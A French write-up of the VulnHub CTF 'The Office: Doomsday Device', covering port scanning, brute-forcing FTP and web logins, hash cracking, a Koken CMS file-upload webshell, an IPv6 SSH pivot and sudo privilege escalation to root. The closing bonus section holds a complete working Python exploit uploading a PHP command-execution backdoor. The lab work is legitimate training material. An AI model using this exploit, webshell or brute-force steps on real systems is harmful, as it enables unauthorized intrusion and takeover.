# Solution du CTF The Office: Doomsday Device de VulnHub

Gotta catch 'em all
-------------------

[Doomsday Device](https://www.vulnhub.com/entry/the-office-doomsday-device,627/) est un CTF de type boot2root créé par [pentestmonkey1](https://twitter.com/pentestmonkey1) et disponible sur VulnHub.  

Il y a 8 flags à récupérer sur la machine virtuelle dont le thème est centré autour de la série TV *The Office*. Pas besoin de la connaître pour résoudre le CTF puisque j'en suis arrivé à bout. Une simple recherche sur Internet aura aidé à un moment.  

Allez c'est parti !  

```plain
$ sudo nmap -sCV -T5 -p- 192.168.56.18 
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.18 
Host is up (0.00020s latency). 
Not shown: 65530 closed tcp ports (reset) 
PORT      STATE    SERVICE VERSION 
21/tcp    open     ftp     vsftpd 3.0.3 
22/tcp    filtered ssh 
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu)) 
|_http-title: Site doesn't have a title (text/html). 
| http-robots.txt: 1 disallowed entry  
|_/nothingtoseehere 
|_http-server-header: Apache/2.4.29 (Ubuntu) 
18888/tcp open     http    Apache httpd 2.4.29 ((Ubuntu)) 
|_http-generator: Koken 0.22.24 
|_http-title: Dunder Mifflin 
|_http-server-header: Apache/2.4.29 (Ubuntu) 
65533/tcp open     http    Apache httpd 2.4.29 
|_http-title: 403 Forbidden 
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Le serveur FTP n'autorise pas les connexions anonymes donc inutile d'insister pour le moment.  

Sur le port 80 se trouve une page qui indique que le site est en construction mais on remarque une longue chaîne en base64 en fin de page. Une fois décodée on obtient une succession de points et de tirets, ponctués par slashs réguliers. Aucun doute possible c'est du Morse.  

On copie colle le texte [sur dcode.fr](https://www.dcode.fr/code-morse) et on obtient le clair suivant :  

```plain
JIM   AND   PAM   HAVE   TALKED   ABOUT   ME   IN   MORSE   CODE   SEVERAL   TIMES.
BUT   JOKE'S   ON   THEM   BECAUSE   I   KNOW   MORSE   CODE.
SINCE   YOU   COULD   READ   THIS   I   ASSUME   YOU   KNOW   IT   TOO.
ANYWAYS   THIS   IS   JUST   THE   FIRST   FLAG,   YOU   WILL   NEVER   CRACK   MY   INGENIOUS   MACHINE,
DON'T   FORGET   I   AM   BETTER   THAN   YOU   HAVE   EVER   BEEN   OR   EVER   WILL   BE!
DWIGHT
FLAG1:   8CAF9C64F9D1181206FEC7F40A7524B3
```

Pour aller plus loin il faut user d'une énumération web :  

```plain
403        9l       28w      278c http://192.168.56.18/server-status 
200      469l       24w     2819c http://192.168.56.18/ 
301        9l       28w      313c http://192.168.56.18/nick 
301        9l       28w      318c http://192.168.56.18/staffblog
```

Les deux derniers dossiers sont listables. Dans le premier on peut trouver une capture PCAP ainsi qu'un fichier *farewell.txt* avec le contenu suivant :  

> Hey Michael!  
> 
>   
> 
> I just wanted to say goodbye. Through Teach for America, I'm gonna go down to Detroit and teach inner-city kids about computers.  
> 
> You know, I'm the lame IT guy and probably you don't even know my name so, who cares. But I just wanted you to know that the old creepy guy uses a pretty weak password.
>   
> You know, the one who smells like death. You should do something about it.   
> 
>   
> 
> Nick

La capture réseau correspond à une connexion réussie sur le port FTP. Evidemment le mot de passe est en clair, il n'y avait aucune difficulté sur cette partie.  

```plain
220 (vsFTPd 3.0.3)
USER creed
331 Please specify the password.
PASS creed
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,2,15,235,21
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,2,15,215,155
200 PORT command successful. Consider using PASV.
RETR new_identity
150 Opening BINARY mode data connection for new_identity (26 bytes).
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,2,15,190,211
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
```

Ce n'est toutefois pas exactement ce mot de passe qui nous servira car dans le dossier *staffblog* se trouve un document *CreedThoughts.doc* qui nous renseigne :  

> #FLAG3: 50f1ff7bc72bb24c0082be83a8b8c497  
> 
> Reminder: The IT guy told that my password is not safe enough. I wonder how he found out.  
> 
> Anyways, I added 3 digits to the end so it's supersafe now. Nobody's gonna crack that, baby!

On va donc utiliser le code Python suivant pour générer une wordlist :  

```python
for i in range(1000):
    print("creed" + str(i).rjust(3, "0"))
```

Hydra est une fois de plus de la partie :  

```plain
$ hydra -l creed -P pass.txt ftp://192.168.56.18 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 
Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task 
[DATA] attacking ftp://192.168.56.18:21/ 
[21][ftp] host: 192.168.56.18   login: creed   password: creed223 
1 of 1 target successfully completed, 1 valid password found
```

Avant d'aller plus loin, finissons en avec les autres ports web.  

Sur le port 65533 une énumération rapporte un dossier nommé *secret* sur lequel on trouve le flag suivant :  

```plain
#FLAG2: 0a9025f72493da059a26db3acb0e2c42
```

Pour terminer, le port 18888 fait tourner une appli web de galerie d'image et on trouve aussi une URL */admin* qui fait tourner un soft baptisé *Koken*.  

```plain
200        0l        0w        0c http://192.168.56.18:18888/i.php
301        9l       28w      321c http://192.168.56.18:18888/app 
301        9l       28w      323c http://192.168.56.18:18888/admin
301        9l       28w      325c http://192.168.56.18:18888/storage 
403        9l       28w      281c http://192.168.56.18:18888/server-status
```

J'ai essayé rapidement de voir si je trouvais un paramètre pour le script *i.php* qui sert sans doute à lire les images dans l'idée d'obtenir in directory traversal mais sans succès.  

Back to les moutons
-------------------

Une fois connecté au FTP avec les identifiants récupérés plus tôt on remarque deux fichiers :  

```plain
-rw-r--r--    1 0        0            2026 Nov 12  2020 archive.zip 
-rw-r--r--    1 0        0             176 Nov 30  2020 reminder.txt
```

En affichant les fichiers cachés on comprend aussi qu'on est dans le dossier de l'utilisateur *creed*. On peut créer un *.ssh* et une clé autorisée sauf que le port SSH étant derrière un parefeu ça ne servira à rien.  

Le fichier texte a le contenu suivant :  

> Oh snap, I forgot the password for this zip file. I remember, it made Michael laugh when he heard it, but Pam got really offended.   
> 
>   
> 
> #FLAG4: 4955cbee5a6a5a48ce79624932bd1374

L'archive s'est montrée assez récalcitrante à casser. J'ai utilisé une nouvelle fois [Penglab](https://github.com/mxrch/penglab) pour casser le pass. Ce notebook Python qui utilise la puissance de calcul de Google dispose de deux wordlists : la bien connue RockYou ainsi que la gigantesque *hashesorg2019*. C'est avec cette dernière que le mot de passe *bigboobz* est tombé :  

```plain
!hashcat -m 17220 /tmp/hashcat.txt /content/wordlists/hashesorg2019
```

Bien sûr il faut au préalable utiliser l'utilitaire *zip2john* pour convertir l'archive en un hash cassable.  

Deux fichiers sont présents dans cette archive :  

```plain
email:   ASCII text, with very long lines (306), with CRLF line terminators 
michael: PEM RSA private key
```

On dispose de cet email intéressant :  

```plain
To: oscar@dundermifflin.com
Subject: Costume Party
From: michael@dundermifflin.com
Content-Type: text/html; charset="utf8"

Hey Oscar!

Angela is out sick so she couldn't manage the costume party gallery right now.
Dwight showed up as a jamaican zombie woman AGAIN. It's gross.
Please remove the picture from the gallery.
Oh yeah, you don't have access to it, so just use Angela's profile.
The password is most probably one of her cats name.
```

ainsi que d'une clé privée SSH mais celle-i est protégée par une passphrase. Rebelote donc mais avec *ssh2john* cette fois puis Penglab avec la commande suivante :  

```plain
!hashcat -m 22931 /tmp/ssh.txt /content/wordlists/hashesorg2019
```

Pour déposer le hash sur le notebook pas de prise de tête j'utilise juste la commande *echo* avec une redirection.  

Il faut compter 13 minutes pour casser le password *mypassword1234*. Une fois de plus le port SSH étant filtré cela ne nous avance pas...  

Kitty cat
---------

Il est temps de se pencher sur l'indication concernant Angela et les noms de ses chats. L'appli web *Koken* demande un email comme identifiant et d'après ce qu'on a vu auparavant on en déduit qu'il faudrait utiliser *angela@dundermifflin.com*. Pour ce qui est des mots de passe possibles j'ai trouvé [ce wiki Fandom](https://theoffice.fandom.com/wiki/Angela%27s_cats) qui recense la liste des chats.  

Je voulais me servir de CeWL pour générer la wordlist directement depuis la page mais en raison d'un freeze j'ai sagement copié / collé les noms dans une wordlist.  

```plain
Sprinkles
Garbage
Bandit
Princess Lady
Mr. Ash
Petals
Comstock
Ember
Milky Way
Diane
Lumpy
Philip
Tinkie
Crinklepuss
Bandit Two
Pawlick Baggins
Lady Aragorn
```

Cette fois *ffuf* est plus approprié pour le brute force web :  

```plain
$ ffuf -u "http://192.168.56.18:18888/api.php?/sessions" -X POST \
  -H "Content-type: application/x-www-form-urlencoded" \
  -d "email=angela%40dundermifflin.com&password=FUZZ" \
  -H "X-Requested-With: XMLHttpRequest" -H "X-Koken-Auth: cookie" -w /tmp/pass.txt  

        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v1.3.1 
________________________________________________ 

 :: Method           : POST 
 :: URL              : http://192.168.56.18:18888/api.php?/sessions 
 :: Wordlist         : FUZZ: /tmp/pass.txt 
 :: Header           : Content-Type: application/x-www-form-urlencoded 
 :: Header           : X-Requested-With: XMLHttpRequest 
 :: Header           : X-Koken-Auth: cookie 
 :: Data             : email=angela%40dundermifflin.com&password=FUZZ 
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10 
 :: Threads          : 40 
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 
________________________________________________ 

Crinklepuss             [Status: 302, Size: 0, Words: 1, Lines: 1] 
:: Progress: [34/34] :: Job [1/1] :: 14 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Cette appli *Koken* a une entrée sur exploit-db et sans trop de surprise il s'agit d'[une faille d'upload](https://www.exploit-db.com/exploits/48706), grand classique des CTFs.  

L'exploit suggère juste de procéder à l'upload depuis l'interface mais en interceptant la requête HTTP (j'ai utilisé OWASP ZAP) pour changer l'extension du fichier à la volée.  

Cela peut sembler bizarre mais en fait l'appli web procède à une vérification de l'extension du fichier à uploader via Javascript avant même que l'envoi des données n'ait lieu. On pourrait bloquer Javascript sur le site mais dans ce cas l'upload risquerait de ne pas se lancer. L'interception est par conséquent une solution pratique pour arriver à nos fins.  

J'obtiens alors mon webshell à cette adresse : *http://192.168.56.18:18888/storage/originals/31/f9/shell.php?cmd=id*  

Plus qu'à upgrader cela avec ReverseSSH et on a tout le confort d'un véritable shell :)  

```plain
www-data@doomsday:/var/www/koken/storage$ cat configuration/database.php    
<?php 
        return array( 
                'hostname' => 'localhost', 
                'database' => 'kokendb', 
                'username' => 'kokenuser', 
                'password' => 'Toby!Flenderson444', 
                'prefix' => 'koken_', 
                'socket' => '' 
        );
```

A défaut de servir vraiment à quelque chose ces identifiants permettent d'accéder à un flag supplémentaire :  

```plain
mysql> select * from flag; 
+----------------------------------------+ 
| record                                 | 
+----------------------------------------+ 
| FLAG5:d2d1b5f66d0e00b35fe2bdee7ffcb398 | 
+----------------------------------------+
```

Très peu pour moi
-----------------

Je trouve une référence à du port knocking dans un des dossiers web :

```plain
www-data@doomsday:/var/www$ ls -al /var/www/html/_hint_/  
total 408 
drwxr-xr-x 2 root root   4096 Nov 30  2020 . 
drwxr-xr-x 5 root root   4096 Nov 17  2020 .. 
-rw-r--r-- 1 root root    733 Nov 30  2020 index.html 
-rw-r--r-- 1 root root 155226 Oct 19  2020 knockknock1.jpg 
-rw-r--r-- 1 root root  93234 Nov 30  2020 knockknock2.jpg 
-rw-r--r-- 1 root root 155226 Oct 19  2020 knockknock3.jpg
www-data@doomsday:/$ md5sum /var/www/html/_hint_/knockknock* 
87e88515fb8bbf9c3b9afba810ddf253  /var/www/html/_hint_//knockknock1.jpg 
76319519515f5c801b2d1940ea2becb1  /var/www/html/_hint_//knockknock2.jpg 
87e88515fb8bbf9c3b9afba810ddf253  /var/www/html/_hint_//knockknock3.jpg
```

L'un des fichiers est différent et renferme l'ordre des ports à taper dans ses tags EXIF   

```plain
$ strings ./html/_hint_/knockknock2.jpg 
Exif 
#FLAG6: c9db6b7cad326cab2bcf0d2a26f7832d 
Open sesame: 5000, 7000, 9000
```

Vu que ça ne me dit rien, bypassons cette étape :p  

Bonjour Michael
---------------

Le port SSH est filtré comme vu au début. Il l'est aussi depuis la VM elle même.  

Il ne l'est pas en revanche pour IPv6. Je profite donc de mon tunnel SSH pour forwarder le port puis je me connecte avec la clé de Michael (pour rappel, ReverseSSH créé par défaut un tunnel sur le port 8888) :  

```bash
$ ssh -L 2223:[::1]:22 -N -p 8888 127.0.0.1
$ ssh -p 2223 -i michael michael@127.0.0.1
```

```plain
$ ssh -p 2223 -i michael michael@127.0.0.1  
______                 _            ___  ____  __  __ _ _        
|  _  \               | |           |  \/  (_)/ _|/ _| (_)       
| | | |_   _ _ __   __| | ___ _ __  | .  . |_| |_| |_| |_ _ __   
| | | | | | | '_ \ / _` |/ _ \ '__| | |\/| | |  _|  _| | | '_ \  
| |/ /| |_| | | | | (_| |  __/ |    | |  | | | | | | | | | | | | 
|___/  \__,_|_| |_|\__,_|\___|_|    \_|  |_/_|_| |_| |_|_|_| |_| 
Enter passphrase for key 'michael':
michael@doomsday:~$ ls -alR 
.: 
total 60 
drwxr-xr-x 6 michael michael  4096 Nov 30  2020 . 
drwxr-xr-x 5 root    root     4096 Nov 16  2020 .. 
-rw------- 1 michael michael  2687 Nov 30  2020 .bash_history 
-rw-r--r-- 1 michael michael   220 Nov 12  2020 .bash_logout 
-rw-r--r-- 1 michael michael  3771 Nov 12  2020 .bashrc 
drwx------ 2 michael michael  4096 Nov 12  2020 .cache 
drwx------ 3 michael michael  4096 Nov 12  2020 .gnupg 
drwxrwxr-x 3 michael michael  4096 Nov 12  2020 .local 
-rw-r--r-- 1 michael michael   807 Nov 12  2020 .profile 
-rw-r----- 1 michael michael 13120 Nov 17  2020 script 
drwx------ 2 michael michael  4096 Nov 13  2020 .ssh 
-rw-r----- 1 michael michael    41 Nov 30  2020 .sus.txt
michael@doomsday:~$ cat .sus.txt 
#FLAG7: 76a2ecd19b04acb89b7fe8c3d83296df
michael@doomsday:~$ sudo -l 
Matching Defaults entries for michael on doomsday: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User michael may run the following commands on doomsday: 
    (ALL) NOPASSWD: /home/creed/defuse*
```

On touche au but. Le fichier *defuse* mentionné n'est pas présent dans le dossier de *creed* mais on peut le déposer par FTP non ?  

Sauf que la bonne blague c'est qu'on ne parvient pas à mettre des droits d'exécution sur le fichier :  

```plain
Commande :	SITE CHMOD 755 defuse
Réponse :	500 Unknown SITE command.
```

THEFUCK! Et si on tente de déposer puis utiliser une clé SSH pour *creed* :  

```plain
michael@doomsday:~$ ssh -i .ssh/id_rsa creed@::1 
______                 _            ___  ____  __  __ _ _        
|  _  \               | |           |  \/  (_)/ _|/ _| (_)       
| | | |_   _ _ __   __| | ___ _ __  | .  . |_| |_| |_| |_ _ __   
| | | | | | | '_ \ / _` |/ _ \ '__| | |\/| | |  _|  _| | | '_ \  
| |/ /| |_| | | | | (_| |  __/ |    | |  | | | | | | | | | | | | 
|___/  \__,_|_| |_|\__,_|\___|_|    \_|  |_/_|_| |_| |_|_|_| |_| 
creed@::1: Permission denied (publickey).
```

Et pour cause, à la fin du fichier */etc/ssh/sshd\_config* on lit ceci :  

```plain
DenyUsers creed
```

Je ne suis pas expert en ligne de configuration sudoers mais la présence de l'astérisque m'a amené à tenter différentes choses. Bien sûr j'ai tenté de créer un dossier *defuse* et d'ajouter une remontée d'arborescence pour exécuter un autre binaire... sans succès.  

J'ai créé ledit fichier avec vraiment un astérisque comme dernier caractère. Aucune utilité si ce n'est de faire bugger FileZilla :D  

Finalement LinPEAS pouvait m'indiquer que le fichier de configuration du serveur FTP est modifiable :  

```plain
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500) 
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files 
/dev/mqueue 
/dev/shm 
/etc/vsftpd.conf 
/home/michael 
/run/lock 
/run/screen 
/run/screen/S-michael

michael@doomsday:~$ ls -l /etc/vsftpd.conf  
-rwxrwxrwx 1 root root 5924 Dec  3  2020 /etc/vsftpd.conf
```

Il faut alors changer la valeur de l'option *chmod\_enable* en fin de fichier et relancer la VM.  

J'ai downloadé et uploadé bash avec le nom *defuse* et c'était bon :  

```plain
michael@doomsday:~$ sudo /home/creed/defuse -p
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag.txt
# cat flag.txt
IDENTITY THEFT IS NOT A JOKE! Millions of families suffer every year.
But anyways. You beat me. You are the superior being.

Dwight Schrute
Assistant Regional Manager

#FLAG8: ebadbecff2429a90287e1ed98960e3f6

  _____                  _             __  __ _  __  __ _ _ 
 |  __ \                | |           |  \/  (_)/ _|/ _| (_)
 | |  | |_   _ _ __   __| | ___ _ __  | \  / |_| |_| |_| |_ _ __  
 | |  | | | | | '_ \ / _` |/ _ \ '__| | |\/| | |  _|  _| | | '_ \ 
 | |__| | |_| | | | | (_| |  __/ |    | |  | | | | | | | | | | | |
 |_____/ \__,_|_| |_|\__,_|\___|_|    |_|  |_|_|_| |_| |_|_|_| |_|

```

Bonus
-----

Comme il n'y en avait pas j'ai codé un exploit pour la faille du Koken :  

```python
import sys 
from random import choices 
from string import ascii_lowercase 
from time import time 

import requests 
from requests.exceptions import RequestException, JSONDecodeError 

# Exploit is based on https://www.exploit-db.com/exploits/48706 
print("Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)") 
print("-- devloop.users.sf.net 2022 --") 
if len(sys.argv) < 4: 
    print(f"Usage: python {sys.argv[0]} http://target.tld/path/to/token/ email password") 
    sys.exit() 

BACKDOOR = b'<?php system($_GET["cmd"]); ?>' 
FILENAME = "".join(choices(ascii_lowercase, k=20)) + ".php" 

path = sys.argv[1] 
email = sys.argv[2] 
password = sys.argv[3] 

sess = requests.session() 
sess.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0" 
sess.headers["X-Koken-Auth"]  = "cookie" 
sess.headers["X-Requested-With"] = "XMLHttpRequest" 
sess.headers["Origin"] = path 

try: 
    response = sess.post( 
        f"{path}/api.php?/sessions", 
        data={"email": email, "password": password}, 
        headers={"Accept": "application/json, text/javascript, */*; q=0.01"}, 
        timeout=10, 
    ) 

    try: 
        info = response.json() 
    except JSONDecodeError as exception: 
        print("Login failed, check creds") 
        sys.exit() 

    if "token" in info: 
        print(f"Successfully authenticated as {info['user']['first_name']} {info['user']['last_name']}") 
    else: 
        print("Login failed, check creds") 
        print(f"Response: {info}") 
        sys.exit() 
except RequestException as exception: 
    print(f"Request to target failed: {exception}") 
    sys.exit() 

try: 
    response = sess.post( 
        f"{path}/api.php?/content", 
        data={ 
            "name": FILENAME, 
            "chunk": 0, 
            "chunks": 1, 
            "upload_session_start": int(time()), 
            "visibility": "unlisted", 
            "license": "all", 
            "max_download": "none", 
        }, 
        files={ 
            "file": (FILENAME, BACKDOOR, "image/png"), 
        } 
    ) 
    try: 
        info = response.json() 
    except JSONDecodeError as exception: 
        print("Upload failed, check response:") 
        print(response.text) 
        sys.exit() 

    backdoor_url = info["original"]["url"] 
    print(f"Enjoy your shell at {backdoor_url}?cmd=id") 
    print(sess.get(f"{backdoor_url}?cmd=id").text) 
except RequestException as exception: 
    print(f"Upload failed :'(")

```

You're welcome.  

```plain
$ python3 koken_exploit.py http://192.168.56.18:18888/ angela@dundermifflin.com Crinklepuss                                   
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated) 
-- devloop.users.sf.net 2022 -- 
Successfully authenticated as Angela Martin 
Enjoy your shell at http://192.168.56.18:18888//storage/originals/a6/49/slrejsflxgxopplfbcfp.php?cmd=id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


*Published January 27 2022 at 23:42*